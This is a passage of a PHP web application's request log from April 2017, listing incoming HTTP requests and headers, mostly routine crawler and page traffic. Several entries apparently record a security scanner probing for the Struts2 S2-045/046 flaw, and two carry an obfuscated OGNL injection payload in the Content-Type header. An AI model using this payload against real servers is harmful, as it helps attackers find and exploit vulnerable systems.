  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:43:51+08:00 ] 101.37.28.32 140.205.201.46 POST /
[ log ] 101.37.28.32/ [运行时间：0.002684s][吞吐率：372.60req/s] [内存消耗：650.65kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '431',
  'host' => '101.37.28.32',
  'content-type' => 'multipart/form-data; boundary=-333053153',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.struts-s2-046)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:43:51+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002627s][吞吐率：380.68req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:45:21+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004451s][吞吐率：224.67req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:45:26+08:00 ] 101.37.28.32 140.205.201.46 GET /index.php
[ log ] 101.37.28.32:80/index.php [运行时间：0.004448s][吞吐率：224.82req/s] [内存消耗：650.59kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:45:40+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32/ [运行时间：0.004395s][吞吐率：227.53req/s] [内存消耗：650.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:45:41+08:00 ] 101.37.28.32 140.205.201.46 POST /
[ log ] 101.37.28.32/ [运行时间：0.004458s][吞吐率：224.32req/s] [内存消耗：652.13kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:45:52+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004534s][吞吐率：220.56req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T13:47:47+08:00 ] 101.37.28.32 140.205.201.46 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004780s][吞吐率：209.21req/s] [内存消耗：650.69kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic MTox',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T18:29:18+08:00 ] 101.37.28.32 221.122.36.85 GET /member/index/account
[ log ] oil.chetuobang.com/member/index/account [运行时间：0.002709s][吞吐率：369.15req/s] [内存消耗：662.88kb] [文件加载：39]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'member',
    1 => 'index',
    2 => 'account',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'referer' => 'http://oil.chetuobang.com/member/index/index',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T19:01:09+08:00 ] 101.37.28.32 118.178.228.154 GET /
[ log ] 59.110.10.132:80/ [运行时间：0.002737s][吞吐率：365.39req/s] [内存消耗：650.24kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '59.110.10.132:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T19:55:27+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002682s][吞吐率：372.86req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T19:55:47+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002683s][吞吐率：372.73req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T20:36:40+08:00 ] 101.37.28.32 222.186.3.237 GET /
[ log ] 101.37.28.32/ [运行时间：0.002635s][吞吐率：379.51req/s] [内存消耗：650.41kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)',
  'accept' => '*/*',
  'host' => '101.37.28.32',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T21:00:42+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002663s][吞吐率：375.53req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T21:01:02+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002649s][吞吐率：377.49req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
